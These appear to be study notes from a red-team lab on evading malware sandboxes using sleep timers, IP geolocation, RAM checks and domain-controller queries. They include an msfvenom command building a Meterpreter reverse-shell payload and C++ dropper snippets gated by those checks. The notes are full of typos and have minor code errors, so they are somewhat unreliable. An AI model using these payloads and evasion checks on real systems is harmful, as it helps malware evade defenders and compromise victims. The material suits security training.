---
title: "Sandbox Evasion"
date: 2026-10-30
weight: 18
---

## 1. Introduction
- Lots of companies deploy a "Defence in Depth" strategy which refers to implementing security in layers, so if one layer fails, there should be another one that an advaersary must evade. 
- In this room, we will be focusing on one unique type of active defense; sandboxes.
- Sandboxes provide a safe way to analyze a potentially malicious file and observe the effects on system and return if the executable is malicious or not.

- One of the most creative and effective ways that blue teamers have come up with to analyze category of Dynamic Analysis is Sandboxing.
- This method involves running the file in the containerized or virtualized environment.
- Sandboxes provide a safe and effective way to monitor what a suspicious looking file does before running it on a production system. There are many commercial sandboxes that may be in place in various parts of network.
![Sandboxing network](/resources_redteam/sandboxing_network.png)

- In the diagram above, there are 3 different sandboxes in plance. It is not uncommon for there to be one or two or even 3 sandboxes in the corporate environment. 
- Often we find them in places like Firewalls, Mail Servers, Workstations.
- Each sandbox may more differently; for example a firewall may execute the attachment in the mail and see what kind of newtork communications occur, whereas a Mail sandbox may ope the email and see if an embedded file within email triggers a download over a protocol like SMB in an attempt to steal a NetNTLM hash, where a host-based anti-virus sandbox may execute the file and monitor for malicious programmatic behavious or changes to the system.
- There are various vendors that make various sandbox products the blue teamers may be able to deploy in a corporate network. 
    - [Palo Alto wildfire - Firewall](https://www.paloaltonetworks.co.uk/products/secure-the-network/wildfire)
    - [Proofpoint TAP - Email sandbox](https://www.proofpoint.com/us/products/proofpoint-attack-preparation-tap)
    - [Falcon sandbox - edr/workstation](https://www.crowdstrike.com/cybersecurity-topics/sandboxing/)
    - [MimeCast - Email Sandbox](https://www.mimemail.com/products/email-security/email-sandbox/)
    - [virustotal - Sample submission site](https://www.virustotal.com/)
    - [any.run - sample submission site](https://any.run/)
    - [Antiscan.me - sample submission site](https://antiscan.me/)
    - [Joe Sanbox - sample submission site](https://www.joesandbox.com/)


## 2. Sandbox evasion
- Now that you have a general idea of what malware sandboxes are, we can move on to learning some evasion techniques at high level.
- We will be breaking down into four different categories
    - Sleeping through sandboxes
    - Geolocation and geoblocking
    - checking network infromation
    - querying network infromation 

### 2.1 Sleeping through sandboxes
- Malware sandboxes are often limited to time constrain to prevent the overallocation of resources which may increase queue drastically. this is crucial aspect that we can abuse; if we know that a sandbox will run for five minute at any given time, we can implement a sleep timer that sleeps for five minutes before our shellcode is executed. This could be done in any number of ways; one common way is to query the current system time and in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, our program can begin normal execution.
- Another popular method is to do complex, comput heavy math, which may take a certain amount of time - for example, calculating the fibonacci sequence up to a given number. Remember that it may take more or less time to do so based on system's  hardware. Masking you application is generally a good idea to avoid anti-virus detections in general, so this should already be something in your toolkit.
- Beware that some sandboxes may alter built-in slepp functions; various anti-virus vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommendeed you develp your own sleep functions. Here are couple of blog posts about bypassing sleep functions
    - https://evasions.checkpoint.com/src/Evasions/techniques/timing.html
    - https://wwww.joesecurity/blog/660946897093663167

### 2.2 Geolocation
- One defining factor of sandboxes is that they are often located off-premise and are hosted by anti-virus providers. If you know you are attacking tryhackme, a european company, and you binary is executed in California, you can make an educated guess that the binary has ended up in a sandbox. you may choose to implement a geolocation filter on your program that checks if the IP address block is owned by the company you are targetting or if it is from a residential address space. there are several services that you can use to check this information.
    - ifconfig.me
    - https://rdap.arin.net/registry/ip/1.1.1.1
- Ifconfig.me can be used to retrieve your current IP address, with additional information being optional. Combining this with ARIN's RDAP allows you to determine the ISP returned in an easy to parse format (JSON)
- It is important to note that this method will only work if the host has internet acess. Some organizations may build a block list of specific domains, so you should 100% sure that this method will work for organizatino oyu are attempting to leverage this against.


### 2.3 Checklig system information
- Another incrdebly popular method is to observe system information. Most sandboxes typically have reduced resources. A popular malware sandbox service, Any.Run, only allocate 1 CPU core, and 4GB of ram per lab machine.
- Most workstations in the network typically have 2-8 cpu cores, 8-32gb RAM, and 256-1TB+ of drive space. This incredibly dependent on the organization that you are targetting, but generally you can expect more than 2 cpu cores per system and more tahn 4 GB RAM. Knowing this, we can tailer our code to query for basic system info.
- By no means is this an exhaustive list, but here are some additional examples of things you may be able to filter an:
    - Storage medium serial nubmer
    - PC hostname
    - BIOS/UEFI Version/SErial number
    - Windows product key/os version
    - Netowrk adatper information
    - virualization checks
    - Current signed in user
    - and muhc more !

### 2.4 QUering internet information.
- The last method is the most open-ended method that we will be covering. because of its open endedness it is considered one of more advanced methods as it involves querying information about the active directory. 
- Almost no malware sandboxes are joined in a domain, so it's relatively safe to assume if the machine is not joined to a domain, it is not the right target, however you cant alwys be too sure, so you should collect some information about the domain to be safe. there are many objects that you can query, here are some to consider
    - Computer
    - User accounts
    - last user login
    - Groups
    - Domain Admins
    - Enterprice admis
    - Domain controller
    - Service accounts
    - Dns servers.
- there techniques can vary in difficuly, therefore you should consider how much time and effort you want to spend building out these evasion methods. A simple method, such as checking the systms environment variables for an item like the LogonServer, LogonUserSid, LogonDomain ma be much easier thatn implementing a windows API.

### 2.5 Setting the stage.
- Now that you have a better understanding of what sandbox bypass method types exist, we will take it to next step and implement some of the sandbox bypasses in the next task.
- Before we move on to the next task, we are going to be starting with the basic dropper that retrieves shellcode from the webserver and injects it into the memory, and executes the shellcode. it's important to note that all shellcode must be generated with MSFVenom in a format, and must be 64-bit, not 32-bit. It can be generated with the following command. 
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw -o index.raw
python3 -m http.server 8080
```
- The shellcode should be hosted on the attackbox via http server. Python3's http.server module is highly portable and flexible and will server as a good base for this task. In the real world, you may host your shellcode on your c2 server. For ths purposes of the lab, we will be utilizing the attackbox with no c2 server.
- The code attached to this task has been tested  and compiled using visual studio 2019. Download the dropper.cpp, and open it. It's important to note that there are several placeholders values on lines 16,22, 24, 27 and 33 that you must update to make the code function properly. Once you have altered the values, compile the code for a 65-bit release.



## 3. Implementing Various EVasion Techniques
- with this base code aquired, we will take our first step into the world of sandbox evasion.
- we are going through the sleep becasue its the simplest.
### 3.1 Taking Nap
- We can take our template from previous task and add a sleep statement for 120,000MS to it.
- This translates to roughly 120 seconds. Generally, you would want a timer closer to 5 minuets to be sure; however 2 minutes will suffice for testing purposes, we'll now add our sleep statement in the main function.
```cpp
int main() {
    sleep(120000);
    downloadAndExecute();
    return 0;
}
```
- **Testing our code**: After this is done, we can compile andupload the code to `Any.Run`. You can read along with the following tests, and see their behavious on Any.Run by following links. This will serve as our test-ground for sandbox evasion as it provides highly detailed informatin for us. Reviewing the two runs:
    - Sleep bypass
    - No sleep bypass

### 3.2 Geolocation
- Moving onto our next method of evading execution of our shellcode on a sandbox, we will be leveraging eoloaction blocks. Fortunately, we will be able to leverage a good amount of code that is already written for us. Portions of the downloadAndExecute funtion can be re-used for this. We will be reusing the following components:
    - Website URL (c2URL variable)
    - INternet stream (stream variable)
    - String variable (s variable)
    - buffer read (bytesRead variable)
    - Lastly the URLOpenBlockingStreamA funtion
- Integrating this into our code
```cpp
BOOL checkIP() {
    // declare the website that we would like to visit
    const char* websiteURL = "<https://ifconfig.me/ip>";
    //crate an internet stream to access the website
    IStream* stream;
    // create the string variable where we store the string data received.
    string s;
    // create a spce in memory where we will store our ip address
    char buff[35];
    unsigned long bytesRead;
    // open an internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    // while data is being sent from the webserver , write it to memory
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    // compare if the string is equal to the targeted victim's IP, if true return true, else return false
    if (s == "VICTIM_IP") {
        return true;
    }
    else {
        return false;
    }
}
```
- now we must modify our main function so that we can leverage our newly created function
```cpp
int main() {
    if (checkIP()) {
        downloadAndExecute();
    }
    else {
        cout << "HTTP/418 - I'm a Teapot!";
    }
    return 0;
}
```
- **testing our code:** 
    - Now that we have wrapped up our second sandbox evasion technique, it is very important to know that this is incredibly common TTP used by threat actors. BOTH apts and read teamers often use serv ices to check the "Abuse Info" of an ip address to gather information about an IP address to determine if it is a legitimate company or not.
    - Any.Run is well aware of this Anti-sandboxing technique and has even flagged it in our instance. 
        - One with an IP address filter
        - One without an IP address filter
    - Looking at the two reaults, we can see that ifconfig.me is flagged as "questionable/potentially malicious" site used to check for your external IP address, in fact, this sandbox evasion method ended up hurting our score, so it should be usd as a last resort with in recently deployed/custom IP address checking server. The full report found [here](https://any.run/report/c98a60e5d0390ba4ad784b76ec0ce3602272452ffb44ce73dbb849906f2cff4d/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a)


### 3.3 Checking System information
- we are going to start off the system information category with the amount of RAM system has. It's important to note that windows measures data in a non-standard format. if you have ever bought a computer that said it has "256 GB of ssd storage", after turning it on, you would have closer to 240 GB, this is because windows measures data in units of 1024-bytes instead of 1000-bytes, be warned that of memory that accuracy can be a "test guess" instread of a exact number. Now that we know this how can we determine how much memory is installed on the system?
- **Checking System memory:** 
    - Fortunatly, this is a relatively easy thing to find out. We only need windows header file included, and we can call specific windows APi, GlobalMemoryStatusEx, to retrive data for us. 
    - To get this informatin, we must declare the MEMORYSTATUSEX struct, then, we must set the size of the dwLength member to the size of struct. once that is done, we can then call the GlobalMemoryStatusEx Windows API to populate struct with the memory information.
    - In this scenerio, we are specifally interested in the total amount of physical time installed on the system, so we will print out the ullTotalPhys member of the MEMROYSTATUSEX struct to get the size of the memory instaleld in teh system in bytes.
    - We can then override by 1024 3x to get the value of meory installed in GiB. Now let's see what this looks like in C++;
```cpp
#include <windows.h>
#include <iostream>

using namespace std;
BOOL memoryCheck() {
    // declare the MEMORYSTATUSEX struct
    MEMORYSTATUSEX memInfo;
    // set the length of the struct to size of the struct
    memInfo.dwLength = sizeof(memInfo);
    // invoke the GlobalMemoryStatusEx API to get memory information
    GlobalMemoryStatusEx(&memInfo);
    // check if the system memory is grater than 5GB
    if (memInfo.ullTotalPhys/1024/1024/1024 >= 5.00) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}
```
- **Integrating this code into our code*
    - Now that we have the technical know-how we should integrate this check into our code.
    - Generally, most sandboxes have 4GB of RAM dedicated to the machine, so we should check and see if the memory could is grater than 5; if it is not, exit the program, if it is continue  the execution. 
    - We will not be modifying the downloadAndExecute function anymore, from here on, we will be adding noew functions and changing the main function.
```cpp
int main() {
    // evaluate if the installed RAM amount is greater than 5
    // if true download shellcode.
    if (memoryCheck()) {
        downloadAndExecute();
    }
    else {
        // exit the program
        exit(0);
    }
    return 0;
}
```
- **Testing our code**
    - Now that we have finished the second of our third sandbox evasion method, it is important that we test it to ensure that it works. To do so, we are going to upload our files to Any.Run
        - One with the Memory check function
        - One without Memory Check function
    - In the first submission, our memroy check function works without any issue and gracefully exits the program when it notices the device has less than 5GB RAM

### 3.4 Quering Network Information
- For our last evasion technique, we will querying information about the Active Directory Admin.
- We will be keeping it simple by querying the name of the Domain Controller using the `NetGetDCName` windows API. 
- this is a relatively simple windows api that fetches the primary domain controller within the environment. This requires us to specify a pointer to a string for DC Name to be put into.
```cpp
BOOL isDomainController() {
    // creat a long pointer to wide string for our dc Name in live in
    LPCWSTR dcName;
    // query the NetGEtDCName win32 api for the domain controller 
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    // convert the DCName from a wide string to a string
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    // search if the UNC path is referenced in the dcNewName variable.
    if (dcNewName.find("\\\\") != string::npos) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

int main()  {
    if (isDomainController()) {
        downloadAndExecute();
    }
    else {
        cout << "Domain Controller not found!"
        exit(0);
    }
}
```
- **Testing our code**
    - For our last sandbox analysi, we will be using VirusTotal. Looking at the results of the SysInternals Sandbox, we can see that our sandbox evasion technique worked. No Outboud request to the cloudflare was made.

### 3.5 Adding external dependencies in Visual Studio
- For the final evasion method, we must add a new DLL to the project file.
- To do so, ensure your project is first opened. After it is opened, right click on the project name in the "Solution Explorer". In the image below, the project name is called "Console Application2":
- Click properties at the bottom of the list; this will open a new view. Expand the "Linker" tab and select the "input" submenu. We are interested in adding the Netapi32 library.
- To do so, click on the right side with all of the libraries referenced and add Netapi32.lib., Once it is added, press the "apply" button and "ok" to close the window and you are ready to continue development.
![visual studio](/resources_redteam/visualstudio.png)
![visual studio properties page](/resources_redteam/visualstudio_properties.png)


## 4. DIY Sandbox Evasion challenge
### 4.1 The GReat Escape
- Now that you have gained some experience in escaping sandboxes, its time for a challenge.
- In this task, you will be utilizing the code from previous sections to implement the "Ultimate Sandbox Evasion" technique to escape Tryhackme's sandbox program.
- In order to escape the sandbox, you must impement the following techniques
    - check and see if the device is joined to active directory domain
    - Check if the system memory is grater than 1GB of RAM
    - implement an outbound HTTP request to 10.10.10.10
    - Implment a 60-second sleep timer before your payload is retrieved from you web server.
- If your dropeer meets these requirement specified above, the flag will be printed out to you.
- Note: The sandbox evasion techiques can fail. The program analyzes the binary to see if the checks are implemented. The outboud device may not have internet access. - as long as the checks are implemented, the sandbox check should succeed.


























